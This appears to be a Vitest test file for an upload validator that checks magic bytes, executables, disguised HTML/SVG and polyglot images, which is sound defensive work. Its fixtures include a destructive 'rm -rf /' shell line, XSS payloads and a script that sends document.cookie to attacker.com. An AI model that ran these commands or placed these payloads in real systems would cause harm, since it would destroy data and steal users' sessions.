import { describe, it, expect, vi } from "vitest";
import {
  detectMimeTypeFromMagicBytes,
  isExecutableBinary,
  containsDisguisedScriptOrHtml,
  validateFileContentMagicBytes,
  validateFileExtension,
} from "./magicBytes.js";

describe("magicBytes", () => {
  describe("detectMimeTypeFromMagicBytes", () => {
    it("detects JPEG (FF D8 FF)", () => {
      const jpeg = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46]);
      expect(detectMimeTypeFromMagicBytes(jpeg)).toBe("image/jpeg");
    });

    it("detects PNG (89 50 4E 47 0D 0A 1A 0A)", () => {
      const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
      expect(detectMimeTypeFromMagicBytes(png)).toBe("image/png");
    });

    it("detects PDF (%PDF)", () => {
      const pdf = new Uint8Array([0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e, 0x37]);
      expect(detectMimeTypeFromMagicBytes(pdf)).toBe("application/pdf");
    });

    it("returns null for unrecognized binary formats", () => {
      const random = new Uint8Array([0x12, 0x34, 0x56, 0x78]);
      expect(detectMimeTypeFromMagicBytes(random)).toBeNull();
    });
  });

  describe("isExecutableBinary", () => {
    it("flags Windows DOS/PE executable header (MZ - 4D 5A)", () => {
      const exe = new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00]);
      const res = isExecutableBinary(exe);
      expect(res.isExecutable).toBe(true);
      expect(res.format).toContain("Windows Executable");
    });

    it("flags Linux ELF binary header (7F 45 4C 46)", () => {
      const elf = new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01]);
      const res = isExecutableBinary(elf);
      expect(res.isExecutable).toBe(true);
      expect(res.format).toContain("Linux ELF");
    });

    it("flags Mach-O binary (FE ED FA CE)", () => {
      const macho = new Uint8Array([0xfe, 0xed, 0xfa, 0xce, 0x00, 0x00]);
      const res = isExecutableBinary(macho);
      expect(res.isExecutable).toBe(true);
      expect(res.format).toContain("Mach-O");
    });

    it("flags Java class file (CA FE BA BE)", () => {
      const java = new Uint8Array([0xca, 0xfe, 0xba, 0xbe, 0x00, 0x00]);
      const res = isExecutableBinary(java);
      expect(res.isExecutable).toBe(true);
      expect(res.format).toContain("Java Class");
    });

    it("flags Shell script (#!)", () => {
      const sh = new TextEncoder().encode("#!/bin/bash\nrm -rf /");
      const res = isExecutableBinary(sh);
      expect(res.isExecutable).toBe(true);
      expect(res.format).toContain("Shell Script");
    });
  });

  describe("containsDisguisedScriptOrHtml", () => {
    it("flags HTML tags in bytes", () => {
      const html = new TextEncoder().encode("<html><head><script>alert('xss')</script></head></html>");
      const res = containsDisguisedScriptOrHtml(html);
      expect(res.containsDangerousText).toBe(true);
    });

    it("flags SVG markup in bytes", () => {
      const svg = new TextEncoder().encode("<svg onload=alert(1)></svg>");
      const res = containsDisguisedScriptOrHtml(svg);
      expect(res.containsDangerousText).toBe(true);
    });

    it("does not flag clean binary data", () => {
      const clean = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x00, 0x01]);
      const res = containsDisguisedScriptOrHtml(clean);
      expect(res.containsDangerousText).toBe(false);
    });
  });

  describe("validateFileContentMagicBytes", () => {
    it("accepts valid JPEG file content", () => {
      const validJpeg = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46]);
      const res = validateFileContentMagicBytes(validJpeg, "image/jpeg");
      expect(res.isSafe).toBe(true);
      expect(res.detectedMimeType).toBe("image/jpeg");
    });

    it("accepts valid PNG file content", () => {
      const validPng = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
      const res = validateFileContentMagicBytes(validPng, "image/png");
      expect(res.isSafe).toBe(true);
      expect(res.detectedMimeType).toBe("image/png");
    });

    it("accepts valid PDF file content", () => {
      const validPdf = new Uint8Array([0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e, 0x34]);
      const res = validateFileContentMagicBytes(validPdf, "application/pdf");
      expect(res.isSafe).toBe(true);
      expect(res.detectedMimeType).toBe("application/pdf");
    });

    it("rejects executable binary masquerading as JPEG", () => {
      const fakeJpeg = new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00]);
      const res = validateFileContentMagicBytes(fakeJpeg, "image/jpeg");
      expect(res.isSafe).toBe(false);
      expect(res.detectedMimeType).toBe("application/x-executable");
      expect(res.reason).toContain("executable binary");
    });

    it("rejects HTML/SVG payload masquerading as JPEG photo", () => {
      const xssHtml = new TextEncoder().encode("<script>document.location='http://attacker.com?c='+document.cookie</script>");
      const res = validateFileContentMagicBytes(xssHtml, "image/jpeg");
      expect(res.isSafe).toBe(false);
      expect(res.detectedMimeType).toBe("text/html");
      expect(res.reason).toContain("HTML/SVG or script payload");
    });

    it("rejects polyglot image containing HTML/XSS markup", () => {
      // Valid JPEG header followed immediately by <script> tag
      const header = new Uint8Array([0xff, 0xd8, 0xff, 0xe0]);
      const script = new TextEncoder().encode("<script>alert(1)</script>");
      const polyglot = new Uint8Array(header.length + script.length);
      polyglot.set(header, 0);
      polyglot.set(script, header.length);

      const res = validateFileContentMagicBytes(polyglot, "image/jpeg");
      expect(res.isSafe).toBe(false);
      expect(res.reason).toContain("Polyglot");
    });

    it("rejects MIME type mismatch (PNG bytes with expected JPEG)", () => {
      const pngBytes = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
      const res = validateFileContentMagicBytes(pngBytes, "image/jpeg");
      expect(res.isSafe).toBe(false);
      expect(res.detectedMimeType).toBe("image/png");
      expect(res.reason).toContain('magic bytes match "image/png", but expected "image/jpeg"');
    });
  });

  describe("validateFileExtension", () => {
    it("validates correct extensions for JPEG", () => {
      expect(validateFileExtension("receipt.jpg", "image/jpeg").valid).toBe(true);
      expect(validateFileExtension("evidence.jpeg", "image/jpeg").valid).toBe(true);
      expect(validateFileExtension("PHOTO.JPG", "image/jpeg").valid).toBe(true);
    });

    it("validates correct extensions for PNG and PDF", () => {
      expect(validateFileExtension("evidence.png", "image/png").valid).toBe(true);
      expect(validateFileExtension("contract.pdf", "application/pdf").valid).toBe(true);
    });

    it("rejects mismatched or disallowed extensions", () => {
      expect(validateFileExtension("evidence.exe", "image/jpeg").valid).toBe(false);
      expect(validateFileExtension("payload.html", "image/png").valid).toBe(false);
      expect(validateFileExtension("exploit.svg", "image/png").valid).toBe(false);
      expect(validateFileExtension("noextension", "image/jpeg").valid).toBe(false);
    });
  });
});
